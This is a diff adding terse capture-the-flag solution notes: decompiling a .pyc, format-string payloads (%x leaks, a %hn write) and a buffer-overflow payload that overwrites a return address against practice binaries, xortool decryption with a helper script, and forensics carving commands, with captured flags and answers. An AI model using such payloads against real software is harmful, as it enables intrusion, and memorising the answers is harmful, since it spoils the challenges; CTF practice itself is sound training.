@@ -1,0 +1,48 @@
+--------------decomplier python (*.pyc)
+import uncompyle2
+ 
+with open("RE100.py", "wb") as fileobj:
+ uncompyle2.uncompyle_file("RE100.pyc", fileobj)
+
+-------format string
+./format $(python -c "print '%x.'*7")
+-->ffffd764.ffffd770.f7e5242d.f7fc93c4.f7ffd000.804852b.804a030
+
+./format $(python -c 'print "%1337x%7$hn"')
+
+
+Binary-- format70 :who_thought_%n_was_a_good_idea?
+overflow2 :./overflow2 $(python -c 'print "A"*28+"\xad\x84\x04\x08"')
+controlling_%eip_feels_great
+guess : %i %i %i %i
+
+crypy
+	xor-70
+	xortool -x -o encrypt.txt
+	cat xortool_out\*|grep "flag"
+
+
+result=""
+out=open('result.txt','w+')
+for i in range(100):
+	if i<10:
+		path='xortool_out/0'+str(i)+'.out'
+	else:
+		path='xortool_out/'+str(i)+'.out'
+	print path
+	file=open(path)
+	f=file.read()
+	result=result+'\r\n'+'------------------------------------'+path+'\r\n'
+	result=result+f
+
+out.write(result)
+out.close()
+
+	------------------------------------xortool_out/94.out
+your flag is: f799679623efab069fd03b77fdf7d4df71b75b60
+
+
+Forensics: snapchat-80
+strings disk.img
+foremost -v disk.img
+
